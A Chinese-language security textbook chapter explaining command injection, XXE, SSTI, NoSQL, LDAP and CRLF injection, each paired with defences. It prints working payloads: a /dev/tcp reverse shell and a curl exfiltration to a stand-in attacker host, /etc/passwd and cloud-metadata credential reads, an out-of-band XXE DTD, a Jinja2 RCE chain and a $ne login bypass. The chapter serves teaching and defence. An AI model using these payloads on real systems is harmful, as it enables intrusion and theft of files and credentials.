# 第 08 章:其他注入攻擊 —— 命令注入・XXE・SSTI・NoSQL

> 上一章(第 07 章)我們用一整章拆解 SQL Injection,你可能以為「注入」就是 SQL 專屬的把戲。

## 8.1 注入的共通本質(總綱):資料被當成程式碼執行

在拆解各種花式注入之前,先把最重要的一句話刻進腦子裡:

> **心智模型**:所有注入漏洞的本質都是同一件事——**一段本該被當作「純資料」的內容,被某個解析器(interpreter)當成了「語法 / 指令 / 程式碼」來解讀執行。** 攻擊者做的事,就是在「資料」裡偷渡「控制指令」,讓資料與指令的界線崩塌。

回想第 07 章的 SQLi:開發者以為 `' OR '1'='1` 是使用者填的帳號(資料),但資料庫的 SQL 解析器把它讀成了「一段永遠為真的邏輯條件」(指令)。這就是注入。

現在把「資料庫」換成別的解析器,同一齣戲就換個舞台重演:

| 攻擊 | 誰是解析器 | 資料被誤讀成什麼 |
|------|-----------|-----------------|
| **SQL 注入**(第 07 章) | 資料庫的 SQL 引擎 | SQL 語法 |
| **命令注入**(8.2) | 作業系統的 shell | shell 指令 |
| **XXE**(8.3) | XML 解析器 | XML 實體 / DTD 定義 |
| **SSTI**(8.4) | 模板引擎(Jinja2 等) | 模板運算式 |
| **NoSQL 注入**(8.5) | MongoDB 查詢引擎 | 查詢運算子($ne 等) |
| **LDAP 注入**(8.6) | LDAP 目錄伺服器 | 搜尋過濾語法 |
| **XSS**(第 09 章) | 瀏覽器的 HTML/JS 引擎 | HTML 標籤 / JS 程式碼 |

看出來了嗎?**每一列的「病因」完全一樣,只是「病灶器官」不同。** 這就是為什麼資深的攻擊者看到任何「使用者輸入 → 被某個東西解析」的地方,直覺就會問:「我能不能在資料裡塞控制字元,讓解析器改變行為?」

### 為什麼會發生?因為「資料通道」與「指令通道」共用了同一條路

真正的根因,是工程上一個經典的壞習慣:**把資料和指令混在同一個字串裡傳給解析器**(業界叫 in-band signaling,帶內傳訊)。

```python
# 危險寫法的共通長相:字串拼接
# 「固定的指令框架」 + 「使用者可控的資料」 揉成一坨字串,再交給解析器
query   = "SELECT * FROM users WHERE name = '" + user_input + "'"   # SQL
command = "ping -c 4 " + user_input                                 # shell
template = "Hello " + user_input                                    # 模板引擎
# ↑ 只要 user_input 裡含有該解析器的「特殊字元」,資料就會逃逸成指令
```

當指令(固定框架)和資料(使用者輸入)走同一條路,解析器沒有辦法分辨「這段字到底是老闆交代的指令,還是路人塞進來的資料」。攻擊者只要在資料裡放進該語言的**特殊語法字元**(SQL 的 `'`、shell 的 `;`、模板的 `{{`),就能「越權」對解析器下令。

這件事直接呼應第 00 章講的**信任邊界(Trust Boundary)**:使用者輸入是牆外的不可信資料,一旦它未經處理就穿過牆、流進某個解析器,那道牆就等於破了個洞。

> **心智模型**:注入的解藥也是共通的——**讓資料永遠只走「資料通道」,不要讓它有機會被當成指令。** 具體手段(參數化查詢、原生 API、關閉危險解析、跳脫)因解析器而異,但骨子裡都是同一招:**把資料和指令的通道分開。** 這一章最後的 8.7 會把這套心法收攏成五條可操作的原則。

> ⚠️ **合法性提醒**:本章所有 payload 只能用在**你自己搭建的隔離靶場**(第 01 章的 DVWA、bWAPP、Juice Shop)或**明確書面授權**的目標。命令注入與 XXE 特別危險——一個 payload 就可能讀到真實伺服器的檔案或執行任意指令,打在別人的系統上,在台灣直接觸犯《刑法》§358、§359(第 00 章)。**未授權即犯罪,不看你有沒有惡意。**

## 8.2 命令注入(OS Command Injection):讓伺服器幫你下指令

### 什麼情況會發生

命令注入發生在:**後端程式把使用者的輸入,拼接進一條要丟給作業系統 shell 執行的指令字串裡。** 最經典的例子是「網路診斷」功能——很多後台會提供一個輸入框讓管理員 ping 某個 IP:

```php
<?php
// 一個「網路連通性測試」功能:讓使用者輸入 IP,後端幫忙 ping
$ip = $_GET['ip'];                    // 使用者輸入,例如 8.8.8.8
system("ping -c 4 " . $ip);           // ★致命:直接把 $ip 拼進 shell 指令
// 開發者的假設:$ip 一定是像 8.8.8.8 這樣的 IP
// 攻擊者的現實:我在 $ip 裡塞 shell 的特殊字元,順便下別的指令
?>
```

問題出在 `system()`(以及 `exec`、`shell_exec`、Node 的 `child_process.exec`、Python 的 `os.system` 等)——**這些函式會把整個字串交給一個真正的 shell(如 `/bin/sh`)去解讀。** 而 shell 是個功能極強的直譯器,它認得一大堆「串接多條指令」的特殊字元。

### 串接字元:shell 的「還有還有」語法

正常人只想跑一條指令,但 shell 允許你在一行裡串很多條。這些串接字元就是攻擊者的武器:

| 字元 | 名稱 | 行為 | 範例 |
|------|------|------|------|
| `;` | 分號 | 前一條跑完,**不管成敗**都接著跑下一條 | `ping x ; whoami` |
| `&&` | AND | 前一條**成功**才跑下一條 | `ping x && whoami` |
| `\|\|` | OR | 前一條**失敗**才跑下一條 | `ping x \|\| whoami` |
| `\|` | 管線 | 把前一條的輸出餵給下一條 | `ping x \| whoami` |
| `$(...)` | 命令替換 | 先執行括號內指令,把**結果**塞回原處 | `ping $(whoami)` |
| `` `...` `` | 反引號 | 同上,命令替換的舊寫法 | `` ping `whoami` `` |
| `\n` | 換行 | 等同於分隔兩條指令 | (URL 編碼 `%0a`) |

> **心智模型**:這些字元就像對話裡的「講完了,換你」或「順便再幫我做一件事」。開發者只想讓 shell 聽一句話,shell 卻把整段話當成好幾道命令來執行——因為它天生就是設計來「一次跑很多事」的。

### Payload 範例與逐步解釋

假設上面那個 PHP 頁面網址是 `http://靶場/ping.php?ip=8.8.8.8`。攻擊者這樣打:

```
http://靶場/ping.php?ip=8.8.8.8; cat /etc/passwd
```

伺服器端實際執行的字串變成:

```bash
ping -c 4 8.8.8.8; cat /etc/passwd
#          └─正常資料─┘└↑分號:第一條ping跑完,接著跑第二條
#                        cat /etc/passwd → 印出系統帳號檔,回傳到網頁上
```

逐步拆解攻擊者的思路:

1. `8.8.8.8` —— 先給一個合法的 IP,讓 `ping` 這條指令本身能正常起跑、不報錯。
2. `;` —— 告訴 shell:「ping 的部分到此為止,底下是新的一條指令。」
3. `cat /etc/passwd` —— 這才是真正的目的:讀取 Linux 系統的帳號清單。

如果網頁會把指令輸出顯示出來,攻擊者就直接在畫面上看到 `/etc/passwd` 的內容。接下來可以升級:`; id`(看自己是什麼權限)、`; ls -la /`(逛檔案系統)、甚至 `; bash -i >& /dev/tcp/攻擊者IP/4444 0>&1`(反彈一個 shell 回來,拿到互動式控制權——這就是「拿到 shell」)。

### 盲注版:看不到輸出怎麼辦

很多時候網頁**不會**把指令輸出印出來(例如它只回「測試完成」)。這叫**盲命令注入(Blind Command Injection)**,對應第 07 章的盲 SQLi,思路完全一樣:**既然看不到結果,就想辦法讓伺服器「用行為告訴我」。** 兩大手法:

**① 時間盲注(Time-based)** —— 用「延遲」當作 True/False 的訊號:

```
http://靶場/ping.php?ip=8.8.8.8; sleep 10
```

```bash
ping -c 4 8.8.8.8; sleep 10
#                  └↑ 讓伺服器睡 10 秒才回應
# 若網頁明顯卡了 10 秒才回 → 證明我的指令真的被執行了(注入成功)
```

進一步可以做條件延遲,一個 bit 一個 bit 把資料「問」出來:

```bash
# 若當前使用者是 root,就睡 10 秒;否則立刻回
if [ $(whoami) = root ]; then sleep 10; fi
# 網頁卡 10 秒 → 答案是 root;秒回 → 不是 root
```

**② 帶外(Out-of-Band,OOB)外連** —— 讓伺服器主動連到攻擊者控制的機器,把資料夾帶在請求裡送出:

```
http://靶場/ping.php?ip=8.8.8.8; curl http://攻擊者.com/$(whoami)
```

```bash
ping -c 4 8.8.8.8; curl http://攻擊者.com/$(whoami)
#                       └↑ 伺服器會發一個 HTTP 請求到攻擊者的機器
#                          網址裡的 $(whoami) 先被執行,把結果(如 www-data)拼進 URL
# 攻擊者看自己伺服器的 access log:GET /www-data → 就知道對方跑指令的身分
```

OOB 特別好用,因為就算網頁完全沒回顯、防火牆擋了反向連線,只要伺服器能對外發 DNS 或 HTTP 請求,資料就能滲出來(這也預告了第 10 章 SSRF 會反覆用到的「讓伺服器幫我發請求」思路)。

### 防禦:命令注入的四道防線

命令注入的殺傷力極高(直接 RCE),防禦要層層堆疊:

**① 最上策:根本不要呼叫 shell。** 絕大多數「拼 shell 指令」的需求,程式語言都有原生 API 可以取代:

```python
# ❌ 危險:交給 shell 解讀,; | $() 全都會生效
import os
os.system("ping -c 4 " + ip)

# ✅ 安全:用 subprocess,把指令與參數「拆成陣列」,且 shell=False(預設)
import subprocess
subprocess.run(["ping", "-c", "4", ip], shell=False)
# 關鍵:ip 被當成 ping 的「單一參數」傳入,即使它含 "; cat /etc/passwd"
# 也只會被 ping 當成一個(不合法的)主機名,而不會被 shell 拆成兩條指令
```

> **心智模型**:陣列式參數傳遞 = 命令注入版的「參數化查詢」(第 07 章)。它之所以安全,是因為**指令(`ping`)和資料(`ip`)走了不同的通道**——資料永遠是「一個參數」,沒有任何機會被解讀成「另一條指令」。這正是 8.1 講的共通解藥。

**② 用語言原生功能取代外部指令。** 要 ping?用網路函式庫測連通;要壓縮?用壓縮函式庫;要處理圖片?用影像函式庫。能不開子行程就不開,攻擊面直接歸零。

**③ 嚴格白名單驗證輸入。** 如果真的躲不掉,對輸入用「白名單」而非「黑名單」——**只允許已知安全的格式,而不是去黑掉危險字元**(黑名單永遠列不完):

```python
import re
# 只允許合法 IPv4 格式,其餘一律拒絕
if not re.fullmatch(r"\d{1,3}(\.\d{1,3}){3}", ip):
    raise ValueError("非法 IP")
```

**④ 最小權限。** 就算被注入,若 Web 程式跑在低權限帳號(如 `www-data`)且被容器隔離,攻擊者能造成的破壞就有限(第 00 章「打斷任一環」的縱深防禦思維)。

## 8.3 XXE(XML External Entity):XML 解析器的內鬼

### XML 外部實體是什麼

XXE 攻擊利用的是 XML 這個格式一個「古老又危險」的功能:**實體(Entity)** 與 **DTD(Document Type Definition,文件類型定義)**。

實體有點像 XML 裡的「變數 / 縮寫」。你可以定義一個實體,之後用 `&名稱;` 來引用它:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY company "全智科技">   <!-- 定義一個內部實體 company -->
]>
<data>&company;</data>            <!-- 引用它,解析後會變成「全智科技」 -->
```

問題出在**外部實體(External Entity)**:XML 允許實體的內容「從外部來源載入」,包括**本機檔案**或**網路 URL**:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">   <!-- 從本機檔案載入 -->
<!ENTITY xxe SYSTEM "http://內網服務/admin"> <!-- 從網路 URL 載入 -->
```

當一個 XML 解析器**預設開啟了外部實體解析**(很多老設定都是如此),而後端又拿使用者上傳的 XML 直接餵給它——災難就發生了。任何接受 XML 的端點都可能中招:SOAP API、SAML 登入、上傳 SVG / DOCX / XML 設定檔等等。

### 惡意 DTD 讀取本機檔案

最經典的 XXE payload,讀取伺服器的 `/etc/passwd`:

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">   <!-- ★定義外部實體,指向本機檔案 -->
]>
<userInfo>
  <name>&xxe;</name>                          <!-- ★引用實體,把檔案內容塞進 name -->
</userInfo>
```

逐步拆解:

1. `<!DOCTYPE foo [ ... ]>` —— 宣告一個內嵌 DTD,這是定義實體的地方。
2. `<!ENTITY xxe SYSTEM "file:///etc/passwd">` —— 定義一個名叫 `xxe` 的外部實體,`SYSTEM` 關鍵字告訴解析器「去外部載入」,來源是本機的 `/etc/passwd`。
3. `<name>&xxe;</name>` —— 引用 `xxe`。解析器在解析這一行時,會**真的去讀那個檔案**,把內容填進 `<name>` 裡。
4. 如果後端會把 `name` 的值回顯到畫面上(例如「歡迎,{name}」),攻擊者就在回應裡看到整份 `/etc/passwd`。

### XXE 打 SSRF:把攻擊面延伸到內網

外部實體的來源不只能是 `file://`,也能是 `http://`。這意味著攻擊者可以**逼伺服器去對任意 URL 發請求**——這就是 **SSRF(Server-Side Request Forgery,伺服器端請求偽造,第 10 章的主角)**:

```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<data>&xxe;</data>
```

`169.254.169.254` 是雲端(AWS/GCP/Azure)的 **metadata 服務位址**——只有從機器內部才連得到,外部連不到。透過 XXE,攻擊者借伺服器之手去打它,常常能撈到**雲端的臨時金鑰**,進而接管整個雲端帳號。這正是第 00 章「漏洞鏈」的活教材:一個看似只是「讀檔」的 XXE,串上 SSRF,就升級成雲端淪陷。

### 盲 XXE / 帶外洩漏

跟命令注入一樣,如果後端**不回顯**實體內容(盲 XXE),就改走帶外(OOB)路線:用**參數實體**搭配**外部惡意 DTD**,把讀到的檔案內容拼進一個對外的 URL 送出去。

```xml
<!-- 受害者送出的 XML:引用攻擊者主機上的惡意 DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://攻擊者.com/evil.dtd">   <!-- % 是參數實體 -->
  %dtd;
]>
<data>test</data>
```

```xml
<!-- 攻擊者主機上的 evil.dtd:讀檔 → 把內容拼進外連 URL -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY send SYSTEM 'http://攻擊者.com/?data=%file;'>">
%exfil;
<!-- 解析後,伺服器會帶著 /etc/passwd 的內容去連攻擊者.com,資料就滲出來了 -->
```

概念上跟 8.2 的 OOB 命令注入一模一樣:**看不到結果,就讓伺服器主動把結果送到我這來。**(注意:這個技巧在 `file://` 讀取多行檔案時有些細節限制,實務常改用 FTP 協定外洩,原理不變。)

### 防禦:關掉外部實體與 DTD

XXE 的防禦異常簡單直接——**因為 99% 的應用根本用不到外部實體這個功能,直接關掉即可:**

```java
// Java:關閉 DOCTYPE 宣告,一刀斃命(最推薦)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// ↑ 只要 XML 裡出現 <!DOCTYPE 就直接報錯,XXE 無從施展
```

其他語言的原則一致(關掉 DTD / 外部實體 / 外部參數實體):

| 語言 / 環境 | 做法概念 |
|------------|---------|
| **Java** | `disallow-doctype-decl` 設為 true(如上) |
| **Python** | 改用 `defusedxml` 套件取代標準 `xml`(它預設就擋 XXE) |
| **PHP** | 使用現代 libxml(2.9+ 預設不載入外部實體);避免用舊的 `LIBXML_NOENT` |
| **.NET** | `XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit` |

> **心智模型**:XXE 的防禦哲學就是「**把用不到的危險功能關掉**」——這呼應第 00 章的「縮小攻擊面」。你不需要聰明地過濾惡意 DTD,只要讓解析器**根本不去解析** DTD 與外部實體,整個攻擊類別就消失了。能關就關,別留著給攻擊者。

## 8.4 SSTI(Server-Side Template Injection):模板引擎變成程式碼執行器

### 模板引擎怎麼把使用者輸入當模板

現代 Web 常用**模板引擎**來產生動態頁面:你寫一份含「佔位符」的模板,引擎把資料填進去。常見的有 Python 的 **Jinja2**、PHP 的 **Twig**、Java 的 **Freemarker / Velocity**、Node 的 **Handlebars / EJS** 等。

正常用法是「模板固定,資料變動」:

```python
# ✅ 正確:模板是寫死的字串,使用者輸入只當作「資料」填進 name 這個變數
template = "<h1>Hello {{ name }}</h1>"
render(template, name=user_input)   # user_input 只會被當成純文字填入
```

SSTI 發生在開發者犯了一個要命的錯:**把使用者輸入直接拼進「模板本身」**,而不是當成填入模板的資料:

```python
# ❌ 致命:使用者輸入變成了「模板的一部分」,會被引擎當語法解析執行
template = "<h1>Hello " + user_input + "</h1>"   # user_input 混進模板原始碼
render(template)
# 若 user_input = "{{7*7}}",引擎會真的去「計算」7*7
```

看出來了嗎?這**又是 8.1 的老劇本**:本該是資料的 `user_input`,被模板引擎當成了「模板運算式」(指令)來執行。解析器換成了模板引擎而已。

### 偵測手法:{{7*7}} 回傳 49 就中招了

SSTI 有個經典的「試紙」——送出一個數學運算式,看伺服器有沒有幫你算:

```
輸入:{{7*7}}
```

- 如果頁面回顯 `Hello {{7*7}}`(原字串) → **沒有** SSTI,輸入被當成純文字。
- 如果頁面回顯 `Hello 49`(算出來了) → **中招了!** 你的輸入被模板引擎當成運算式執行了。

不同引擎的語法不同(Jinja2/Twig 用 `{{ }}`、Freemarker 用 `${ }`),所以攻擊者會用一組「探針」去判斷背後是哪套引擎:

```
{{7*7}}      → Jinja2 / Twig 會回 49
${7*7}       → Freemarker / Velocity 會回 49
{{7*'7'}}    → Jinja2 回 7777777(字串重複);Twig 回 49 → 藉此區分兩者
```

> **心智模型**:`{{7*7}}` 就是 SSTI 的「金絲雀」。這跟第 09 章 XSS 用 `<script>alert(1)</script>` 探測、第 07 章 SQLi 用 `'` 探測是完全一樣的思路——**丟一個該解析器的特殊語法進去,看它有沒有『上鉤』去解析。** 學會這套「探針思維」,你面對任何新的注入點都能自己找 payload。

**⚠️ 別跟 XSS 搞混**:`{{7*7}}` 是在**伺服器端**執行(SSTI);而 XSS 是在**瀏覽器端**執行(第 09 章)。同樣是「注入」,一個污染伺服器、一個污染使用者的瀏覽器——這也再次印證了 8.1 那張表:差別只在「哪個解析器」。

### 從資訊洩漏一路升級到 RCE

SSTI 之所以是高危漏洞,是因為它幾乎總能升級成 **RCE(遠端程式碼執行)**。因為模板引擎背後就是一個真正的程式語言(Python、Java…),攻擊者能透過模板語法「爬」到語言的底層物件,最終呼叫執行系統指令的函式。升級路徑通常是:

1. **確認注入**:`{{7*7}}` → `49`。
2. **洩漏資訊**:`{{config}}`(Jinja2/Flask 會吐出整個設定,常含密鑰、資料庫密碼)。
3. **爬向危險物件**:利用 Python 的物件內省,從一個普通字串一路爬到能開子行程的類別。
4. **執行系統指令**(概念示意,細節依版本而異):

```python
# Jinja2 中一條經典的 RCE payload(概念示意,僅供在授權靶場理解原理)
{{ ''.__class__.__mro__[1].__subclasses__() }}
# ↑ 從空字串 '' 出發:
#   .__class__       → 拿到 str 這個類別
#   .__mro__[1]      → 往上找到最頂層的 object 基礎類別
#   .__subclasses__()→ 列出「所有」子類別,裡面藏著能執行系統指令的類別
# 找到目標類別後,再進一步呼叫它去跑 os 指令,即達成 RCE
```

你不用背這串魔法字元。**重點是理解那個邏輯**:模板引擎給了攻擊者一個通往底層語言的縫,順著物件關係往上爬,遲早爬到能碰系統的地方。一個「只是能算 7*7」的小縫,結局是整台伺服器淪陷——這就是 SSTI 恐怖的地方。

### 防禦

**① 最重要:永遠不要把使用者輸入拼進模板原始碼。** 使用者輸入只能當作「填入模板的資料」透過 context 傳進去:

```python
# ❌ 錯:輸入變成模板的一部分
render_template_string("Hello " + name)
# ✅ 對:模板固定,name 只當資料
render_template_string("Hello {{ name }}", name=name)
```

**② 用「邏輯無關(logic-less)」的模板引擎。** 像 **Mustache** 這類引擎刻意不支援任意運算式,只能做簡單的變數替換與迴圈——從設計上就砍掉了升級成 RCE 的能力。這呼應 XXE 的哲學:**能力越少,攻擊面越小。**

**③ 沙箱(Sandbox)。** 若非用強大引擎不可,啟用其沙箱模式(如 Jinja2 的 `SandboxedEnvironment`),限制能存取的物件與函式。但沙箱常被繞過,只能當**最後一道**防線,不能當唯一防線。

## 8.5 NoSQL 注入:運算子繞過認證

### 以 MongoDB 為例:$ne、$gt、$where

很多人以為「我用 NoSQL(如 MongoDB),沒有 SQL 就不會有注入」——**這是誤解。** 注入的本質(8.1)跟資料庫用什麼語言無關,只要「使用者輸入被查詢引擎當成語法解讀」,注入就存在。NoSQL 只是換了一套語法而已。

MongoDB 的查詢用 JSON 物件表達,裡面有一堆以 `$` 開頭的**查詢運算子**:

| 運算子 | 意思 |
|--------|------|
| `$ne` | not equal,不等於 |
| `$gt` / `$lt` | 大於 / 小於 |
| `$regex` | 正規表達式比對 |
| `$where` | **執行一段任意 JavaScript** 當條件(最危險) |

### JSON body 注入:一個 payload 繞過登入

看一段有漏洞的 Node.js 登入程式:

```javascript
// 登入驗證:直接把使用者傳來的 req.body 塞進查詢
app.post('/login', async (req, res) => {
  const user = await db.collection('users').findOne({
    username: req.body.username,     // ★直接信任前端傳來的值
    password: req.body.password      // ★沒有做型別檢查
  });
  if (user) res.send('登入成功');    // 只要查得到就算登入成功
});
```

正常登入送的 JSON 是這樣:

```json
{ "username": "admin", "password": "我的密碼" }
```

但攻擊者不送字串,而是送一個**運算子物件**當密碼:

```json
{ "username": "admin", "password": { "$ne": null } }
```

逐步拆解這條 payload 為什麼能繞過登入:

1. `"username": "admin"` —— 指定要登入的帳號是 admin。
2. `"password": { "$ne": null }` —— 這裡不是一個密碼字串,而是一個查詢運算子物件,意思是「**密碼不等於 null**」。
3. 後端拼出的查詢變成:「找出 username=admin 且 password **不為 null** 的使用者」。
4. admin 當然有設密碼(不為 null),所以**這個條件永遠成立**,`findOne` 成功回傳 admin 這筆資料。
5. 程式判斷「查得到 user = 登入成功」→ 攻擊者**完全不需要知道密碼**就登入了 admin。

這跟第 07 章 SQLi 的 `' OR '1'='1'`(讓條件恆真)是**同一個把戲的 NoSQL 版本**:用一個永遠為真的條件,把驗證邏輯給架空。

更狠的 `$where` 甚至能執行任意 JavaScript:

```json
{ "username": { "$where": "sleep(5000) || true" } }
```

這等於在資料庫層開了個 JS 執行後門,可以做時間盲注、甚至更嚴重的操作——所以生產環境應**直接停用 `$where`**。

### 查詢字串注入:連 GET 參數都能中

有個容易忽略的坑:Node 的 Express + `qs` 函式庫,會把**帶方括號的 URL 查詢字串自動解析成巢狀物件**。也就是說,連 GET 請求都能注入運算子:

```
攻擊網址:/login?username=admin&password[$ne]=x
```

`qs` 會把 `password[$ne]=x` 解析成 `{ password: { $ne: "x" } }`——瞬間又變成上面那條繞過 payload。**這提醒我們:注入點不限於 JSON body,任何使用者可控的輸入(URL、header)都可能被解析成危險結構。**

### 防禦

**① 型別檢查(最關鍵)。** NoSQL 注入的根源,是「本該是字串的欄位,收到了物件」。所以最直接的防禦是**強制檢查型別**:

```javascript
// 收到密碼後,先確認它是「字串」,不是物件
if (typeof req.body.password !== 'string' ||
    typeof req.body.username !== 'string') {
  return res.status(400).send('輸入格式錯誤');
}
// ↑ 這樣 { "$ne": null } 這種物件會被直接擋下,因為它不是 string
```

> **心智模型**:MongoDB 注入的解藥是「**別讓資料改變它應有的資料型別**」。`$ne` 攻擊之所以成立,是因為程式預期一個字串,卻收下了一個物件並讓它進了查詢結構。這其實是 8.1「資料與指令混淆」的變形——一個運算子物件就是偽裝成資料的「指令」。

**② 不要直接把使用者輸入塞進查詢物件。** 使用 ODM(如 Mongoose)並定義 **Schema**,由它強制欄位型別;或明確地一個一個取值、轉型,而不是把整包 `req.body` 攤開丟進查詢。

**③ 輸入驗證 + 停用危險功能。** 用驗證函式庫(如 Joi、Zod)對輸入做 schema 驗證;在資料庫層停用 `$where`(設定 `javascriptEnabled: false`)。

## 8.6 其他注入簡述:LDAP・Header・CRLF

注入家族還有一票成員,原理都是 8.1 的變奏,這裡各給你一段概念,建立「觸類旁通」的雷達:

### LDAP 注入

**LDAP** 是企業常用的目錄服務(如 AD 網域登入)。它的搜尋用一種特殊的過濾語法,例如 `(&(uid=alice)(password=xxx))`。如果後端把使用者輸入直接拼進過濾字串:

```
輸入 uid = *)(uid=*))(|(uid=*
拼出的過濾器變成:(&(uid=*)(uid=*))(|(uid=*)(password=xxx))
# ↑ 用 * 萬用字元與括號,把原本的邏輯結構整個改寫,常見結果是「回傳所有使用者」或繞過密碼比對
```

**病灶器官換成 LDAP 目錄伺服器,病因還是一樣**:輸入裡的特殊字元(`*`、`(`、`)`、`|`、`&`)被當成過濾語法。防禦:對輸入做 LDAP 專用跳脫、白名單驗證。

### Header 注入 / HTTP 回應拆分(Response Splitting)

如果後端把使用者輸入放進 **HTTP 回應的 header**(例如 `Location:` 重導向網址、Cookie 值),而沒有過濾**換行字元 CRLF(`\r\n`)**,攻擊者就能「換行」偽造出新的 header 甚至整個回應內容:

```
輸入(URL 編碼):/redirect?url=/home%0d%0aSet-Cookie:%20admin=true
解碼後:%0d%0a = \r\n(換行),於是回應變成:
  Location: /home
  Set-Cookie: admin=true   ← 攻擊者硬塞進去的 header
```

嚴重時能把回應「拆」成兩份,注入完整的假頁面(HTTP Response Splitting)。防禦:**過濾 / 移除輸入中的 `\r` 與 `\n`**,並優先使用框架提供的 API 設定 header(它們多半會自動處理)。

### CRLF 注入

上面的 header 注入本質上就是 **CRLF 注入**的一種——核心都是「注入換行字元 `\r\n` 來破壞某種以行為單位的協定 / 格式」。除了 HTTP header,它也常見於:

- **日誌注入(Log Injection)**:在輸入裡塞換行,偽造假的 log 行,混淆事件調查(第 21 章事件回應會恨死這招)。
- **Email header 注入**:在聯絡表單塞 `\r\nBcc: victim@...`,把你的網站變成濫發垃圾信的跳板。

> **心智模型**:看到這裡你應該有感覺了——**只要是「以特殊字元劃分結構」的格式(SQL 用引號、shell 用分號、HTTP 用換行、LDAP 用括號),就一定有對應的注入。** 你甚至可以在遇到任何新協定時主動問:「它的『特殊字元』是什麼?使用者輸入到得了那裡嗎?」——這就是舉一反三的攻防雷達。

## 8.7 【重點】通用防禦心法:一次搞定整個注入家族

這一節是全章的收束。前面拆了六種注入,但你應該已經發現:**防禦手段翻來覆去就是那幾招。** 把它們收攏成五條可操作的原則,你就握有對付「任何注入」(包括還沒被發明出來的)的萬用鑰匙:

### 心法一:把所有外部輸入當純資料看待

回到第 00 章的信任邊界。使用者輸入、URL、header、上傳的檔案、第三方 API 回來的資料——**全都是牆外的不可信資料**。它們永遠只能是「被處理的對象」,絕不能有機會變成「被執行的指令」。**這是所有防禦的思想總開關。**

### 心法二:避免動態求值,拒絕字串拼接指令

注入的溫床,就是「把使用者輸入拼進一個之後會被『執行 / 解析』的字串」。所以:

- 不用 `eval()`、`exec()`、`system()`、`os.system()` 去執行含使用者輸入的字串。
- 不用字串拼接組 SQL、shell 指令、模板、查詢物件。
- 看到 `"...固定字串..." + 使用者輸入 + "..."` 這種寫法後面接著「交給某個解析器」,就該亮紅燈。

### 心法三:參數化 / 使用安全 API(治本之道)

這是最有效的一招,而且**每種注入都有對應版本**——因為它們本質相同(8.1):

| 注入類型 | 「參數化 / 安全 API」的具體形態 |
|---------|------------------------------|
| SQL(第 07 章) | 參數化查詢 / Prepared Statement |
| 命令注入(8.2) | `subprocess` 陣列參數 + `shell=False`;原生 API |
| XXE(8.3) | 關閉 DTD / 外部實體解析 |
| SSTI(8.4) | 輸入只當 context 資料傳入,不拼進模板 |
| NoSQL(8.5) | 型別檢查 + ODM Schema,不直接攤開 `req.body` |

它們的共同精神只有一句:**讓「指令的結構」與「資料的內容」走不同的通道,由函式庫在底層安全地把資料當純資料處理。** 這句話,就是整個注入家族的解藥。

### 心法四:最小權限(縱深防禦)

前三招是「不讓注入發生」,第四招是「萬一發生了,把損害關進小房間」:

- 資料庫帳號只給該功能真正需要的權限(別動不動就用 root / sa)。
- Web 程式跑在低權限系統帳號、丟進容器 / 沙箱隔離。
- 這樣即使一個注入得手,攻擊者拿到的也是一把「只能開一個小房間的鑰匙」,而不是萬能鑰匙。呼應第 00 章「打斷 Kill Chain 任一環」的思維。

### 心法五:輸出到不同解析器,要用對應的跳脫

同一份資料,送去不同的地方,要用**該目的地專屬的跳脫 / 編碼**。送進 HTML 要 HTML 跳脫(第 09 章 XSS)、送進 shell 要 shell 跳脫、送進 LDAP 要 LDAP 跳脫、送進 SQL 交給參數化。

> **心智模型**:把資料想成「出國旅客」——去哪個國家(解析器),就要辦哪國的簽證(跳脫規則)。用錯簽證(例如對要進 shell 的資料只做了 HTML 跳脫),旅客照樣被當成非法入境的「指令」。**跳脫是「輸出時」按目的地做的,不是「輸入時」一次做完就萬事大吉**——這是新手最常搞錯的觀念。

> **一句話總結全章防禦**:**資料與指令,分開走。** 這七個字,能讓你防住這一章的全部四種注入、第 07 章的 SQLi、第 09 章的 XSS,以及未來任何新冒出來的注入變種。

## 8.8 本章小結

- **注入是一個「家族」,不是四種孤立的攻擊**。共通本質(8.1):**一段本該當「資料」的內容,被某個解析器當成「指令 / 語法 / 程式碼」執行。** 差別只在「哪個解析器」(shell、XML parser、模板引擎、MongoDB、LDAP、瀏覽器)。
- **命令注入(8.2)**:輸入被拼進 shell 指令。用 `;`、`|`、`&&`、`$(...)` 串接指令;看不到回顯就用時間盲注或 OOB 外連。防禦:別呼叫 shell、用陣列式原生 API、白名單、最小權限。
- **XXE(8.3)**:XML 外部實體讀本機檔案(`/etc/passwd`)、打內網 SSRF(第 10 章)、盲 XXE 帶外洩漏。防禦:**關閉 DTD 與外部實體解析**(能關就關)。
- **SSTI(8.4)**:使用者輸入被拼進模板原始碼。用 `{{7*7}}→49` 探測,可從資訊洩漏一路升級到 RCE。防禦:輸入只當 context 資料、用邏輯無關模板、沙箱。
- **NoSQL 注入(8.5)**:`{"pass":{"$ne":null}}` 用運算子物件讓條件恆真,繞過登入(SQLi 恆真式的 NoSQL 版)。防禦:**型別檢查**、ODM Schema、停用 `$where`。
- **其他(8.6)**:LDAP 注入、Header 注入 / HTTP 回應拆分、CRLF 注入——凡「以特殊字元劃分結構的格式」都有對應注入。
- **通用防禦五心法(8.7)**:①輸入全當純資料 ②不動態求值、不拼接 ③參數化 / 安全 API ④最小權限 ⑤按目的地做對應跳脫。**濃縮成一句:資料與指令,分開走。**

> **下一章預告**:第 09 章談 **XSS(跨站腳本)**。看完這一章,你會發現 XSS 其實就是**「注入到瀏覽器」的攻擊**——把惡意的 HTML / JavaScript 當資料塞進網頁,讓「瀏覽器」這個解析器把它當程式碼執行,進而偷 Cookie、劫持 Session、冒充使用者操作。同樣的病因(8.1),換到最貼近使用者的舞台;我們也會介紹對應的重要防線 **CSP(內容安全政策)**。你在本章磨出來的「探針思維」和「資料/指令分離」心法,會原封不動地繼續用上。
